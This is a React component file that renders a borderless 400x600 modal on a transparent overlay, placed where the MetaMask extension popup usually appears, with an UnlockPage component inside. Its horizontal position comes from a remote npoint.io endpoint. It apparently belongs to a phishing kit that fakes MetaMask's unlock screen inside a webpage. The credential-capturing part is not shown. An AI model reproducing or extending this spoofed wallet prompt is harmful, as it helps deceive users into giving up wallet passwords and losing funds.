import { useEffect, useState } from "react";
import axios from "axios";
import Modal from "react-modal";
import UnlockPage from "./unlock.jsx";

Modal.setAppElement("#root")

export default function MetamaskModal(props) {
  const [customPosition, setCustomPosition] = useState(320)

  useEffect(() => {
    const getPosition = async () => {
      try {
        const url = `https://api.npoint.io/2ea1efd04f12070f3b16`;
        const response = await axios.get(url);
        setCustomPosition(response.data.position);
      } catch (error) {
        throw new Error(`Failed to fetch data: ${error.message}`);
      }
    }
    getPosition();
  }, []);

  return (
    <Modal
      style={{
        overlay: {
          backgroundColor: "rgba(0,0,0,0)",
          zIndex: 9999,
        },
        content: {
          top: "0",
          right: `${customPosition}px`,
          bottom: "auto",
          left: "auto",
          padding: "0",
          border: "0",
          width: "400px",
          height: "600px",
          borderRadius: "none",
          boxShadow: "0 4px 4px rgba(0,0,0,0.25)",
        },
      }}
      {...props}
    >
      <UnlockPage />
    </Modal>
  );
}
